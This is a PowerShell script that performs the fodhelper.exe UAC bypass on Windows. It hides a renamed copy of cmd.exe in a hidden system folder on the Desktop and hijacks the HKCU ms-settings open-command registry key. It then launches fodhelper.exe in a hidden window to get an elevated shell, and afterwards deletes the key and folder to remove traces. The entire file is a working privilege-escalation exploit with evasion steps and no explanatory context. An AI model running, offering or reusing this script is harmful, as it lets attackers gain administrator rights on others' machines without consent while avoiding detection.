# Get the Desktop path
try {
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
} catch {
    Write-Error "Failed to retrieve the Desktop path. Exiting script."
    exit
}

# Define the hidden folder path
$hiddenFolderPath = Join-Path -Path $desktopPath -ChildPath ".hiddenFolder"

# Ensure the hidden folder exists
try {
    if (-not (Test-Path $hiddenFolderPath)) {
        New-Item -Path $hiddenFolderPath -ItemType Directory -Force | Out-Null
        Write-Host "Hidden folder created at: $hiddenFolderPath"
    } else {
        Write-Host "Hidden folder already exists at: $hiddenFolderPath"
    }
    # Set folder attributes to hidden and system
    attrib +s +h $hiddenFolderPath
} catch {
    Write-Error "Failed to create or update attributes for the hidden folder. Exiting script."
    exit
}

# Generate a unique name for the copied CMD executable
$uniqueExeNameCmd = [guid]::NewGuid().ToString()
$fullUniqueExeCmd = $uniqueExeNameCmd + ".exe"
$destinationPathCmd = Join-Path -Path $hiddenFolderPath -ChildPath $fullUniqueExeCmd

try {
    # Copy cmd.exe to the hidden folder with a unique name
    $sourceCmdPath = "C:\Windows\System32\cmd.exe"
    if (Test-Path $sourceCmdPath) {
        Copy-Item -Path $sourceCmdPath -Destination $destinationPathCmd -Force
        Write-Host "CMD executable copied to: $destinationPathCmd"
    } else {
        Write-Error "Source CMD executable not found at $sourceCmdPath. Exiting script."
        exit
    }
} catch {
    Write-Error "Failed to copy CMD executable. Exiting script."
    exit
}

# Define the command to execute in the batch script
$CommandsToExecute = @"
start cmd.exe
"@

# Write the commands to a batch script file in the hidden folder
$batchScriptPath = Join-Path -Path $hiddenFolderPath -ChildPath "script.bat"
try {
    $CommandsToExecute | Out-File -FilePath $batchScriptPath -Encoding ASCII
    Write-Host "Batch script created at: $batchScriptPath"
} catch {
    Write-Error "Failed to create batch script. Exiting script."
    exit
}

# Create a registry key for a custom command
$regKeyPath = "HKCU:\Software\Classes\ms-settings\Shell\open\command"

try {
    # Create the registry key and set required properties
    New-Item -Path $regKeyPath -Force | Out-Null
    New-ItemProperty -Path $regKeyPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    # Define the command to execute the batch script with hidden window
    $command = "$destinationPathCmd /c `"$batchScriptPath`""
    Set-ItemProperty -Path $regKeyPath -Name "(default)" -Value $command -Force
    Write-Host "Registry key created and command set to: $command"
} catch {
    Write-Error "Failed to configure the registry key. Exiting script."
    exit
}

# Trigger Fodhelper to execute the command
try {
    $fodhelperPath = "C:\Windows\System32\fodhelper.exe"
    if (Test-Path $fodhelperPath) {
        Start-Process -FilePath $fodhelperPath -WindowStyle Hidden
        Write-Host "Fodhelper.exe executed."
    } else {
        Write-Error "Fodhelper.exe not found. Exiting script."
        exit
    }
} catch {
    Write-Error "Failed to execute fodhelper.exe. Exiting script."
    exit
}

# Dynamic wait for the CMD process to complete
try {
    $isCmdRunning = $true
    Write-Host "Waiting for the CMD process to complete..."
    while ($isCmdRunning) {
        $process = Get-Process -Name $uniqueExeNameCmd -ErrorAction SilentlyContinue
        if ($process -eq $null) {
            $isCmdRunning = $false
            Write-Host "CMD process completed."
        }
        Start-Sleep -Seconds 3
    }
} catch {
    Write-Error "Error during dynamic wait. Exiting script."
    exit
}

# Clean up the registry key after execution
try {
    if (Test-Path $regKeyPath) {
        Remove-Item -Path "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
        Write-Host "Registry key cleaned up."
    }
} catch {
    Write-Warning "Failed to clean up the registry key. Please remove it manually if necessary."
}

# Clean up the hidden folder and its contents
try {
    attrib -s -h $hiddenFolderPath
    if (Test-Path $hiddenFolderPath) {
        Remove-Item -Path $hiddenFolderPath -Recurse -Force
        Write-Host "Hidden folder and its contents have been cleaned up."
    } else {
        Write-Host "Hidden folder does not exist or has already been deleted."
    }
} catch {
    Write-Warning "Failed to clean up the hidden folder. Please remove it manually if necessary."
}

# Script completed successfully
Write-Host "Script completed. All operations executed."
exit
